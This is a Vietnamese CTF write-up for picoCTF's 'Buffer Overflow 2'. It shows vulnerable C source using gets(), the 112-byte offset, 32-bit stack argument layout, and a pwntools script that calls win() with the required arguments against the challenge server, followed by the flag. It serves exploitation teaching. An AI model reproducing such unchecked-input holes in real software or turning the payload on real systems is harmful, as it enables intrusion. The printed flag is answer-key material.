# Buffer Overflow 2
Tiếp tục đến với chuỗi challenge `Buffer Overflow`, ở bài này thì ta có 2 file. Một file binary `vuln` và một file .c `vuln.c`.

Mở file `vuln.c` thì ta có thấy source code như sau:

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

Ta thấy dòng code gây nên lỗi `buffer overflow` như sau:

``` c
gets(buf);
```

Nhìn sơ qua thì ý tưởng cũng giống như bài `Buffer Overflow 1` nhưng lần này hàm `win()` yêu cầu hai tham số là `arg1` và `arg2`.

Và để lấy được flag thì ta phải gọi hàm `win()` với hai tham số `arg1 = 0xCAFEF00D` và `arg2 = 0xF00DF00D`. Thoáng nhìn qua thì có vẻ như bài này sẽ dùng kĩ thuật [ROP](https://ctf101.org/binary-exploitation/return-oriented-programming/). Nhưng cũng giống như bài `Buffer Overflow 1` ta cần dùng lệnh `checksec` để kiểm tra các cơ chế bảo mật được bật trong binary, ta thấy `PIE` không được bật nhưng bên cạnh đó thì đây là một `ELF 32` nên kĩ thuật ROP sẽ không được sử dụng giống như `ELF 64`.

Giống như bài `Buffer Overflow 1`, ta làm điều tương tự để ghi đè địa chỉ hàm `win()` lên địa chỉ trả về của hàm `vuln()`. Vấn đề ở đây là làm sao để `arg1 = 0xCAFEF00D` và `arg2 = 0xF00DF00D`. 

Đầu tiên thì ta tìm cách ghi đè địa chỉ hàm `win()` lên địa chỉ trả về của hàm `vuln()`. Ta có thể dùng `cyclic` để tạo chuỗi kí tự theo quy tắc tuần hoàn nhằm tìm ra `offset` dễ dàng hơn:

![alt text](image.png)

Ta thấy địa chỉ trả về bị ghi đè bởi chuỗi 4 kí tự là `daab`. 

Với chuỗi này thì ta có được `offset` là `112`

``` bash
Qusy$ cyclic -l daab
112
```

Địa chỉ hàm `win()` được tìm thấy là `0x08049296`.

Giờ ta sẽ bắt tay vào việc làm cho hai tham số của hàm thỏa mãn điều kiện đã nói ở trên.

Đối với một tệp `ELF 32` thì khi một hàm được gọi:
- Các đối số sẽ được đẩy lên stack theo thứ tự từ phải qua trái. 
- Sau đó địa chỉ trả về của hàm sẽ được đẩy lên stack.

Vậy giờ sau khi ghi đè địa chỉ hàm `win()` lên địa chỉ trả về của hàm `vuln()` thành công thì ta sẽ tiếp tục nhập thêm 4 bytes nào đó để làm địa chỉ trả về của hàm `win()` sau đó là ghi đè giá trị 2 tham số tương ứng để hàm `win()` có thể in flag.

Thử nghiệm và đã thành công, ta có file exploit như sau:

``` python 
from pwn import *

payload = 112 * b'a' + b'\x96\x92\x04\x08' + 4 * b'a' + b'\x0D\xF0\xFE\xCA' + b'\x0D\xF0\x0D\xF0'
#p = process("./vuln")
p = remote("saturn.picoctf.net", 50190)
p.sendline(payload)
p.interactive()
```

Và ta có flag:

```
picoCTF{argum3nt5_4_d4yZ_27ecbf40}
```